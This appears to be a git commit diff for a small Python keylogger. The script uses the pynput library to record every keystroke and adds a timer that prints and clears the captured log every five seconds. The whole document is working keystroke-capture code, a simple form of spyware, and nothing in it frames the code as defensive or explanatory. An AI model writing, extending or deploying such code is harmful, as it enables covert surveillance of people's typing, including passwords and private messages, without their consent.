148ffb8b961d34e5b7f788a16f63d66d6ad0dac9
JinethBosilu <157296244+JinethBosilu@users.noreply.github.com>
2026-02-14 12:46:29 +0530

    Refactor key logging process and enhance reporting functionality

--- keylogger.py
+++ keylogger.py
@@ -1,18 +1,26 @@
 import pynput.keyboard
+import threading
 
 log = ""
 
 def process_key_press(key):
     global log
     try:
-        log += key.char 
-        print(log)
+        log += str(key.char)
     except AttributeError:
         if key == key.space:
             log += " "
         else:
             log += " " + str(key) + " "
+    
+def report():
+    global log
+    print(log)
+    log = ""
+    timer = threading.Timer(5, report)
+    timer.start()
 
 keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listner:
+    report()
     keyboard_listner.join()
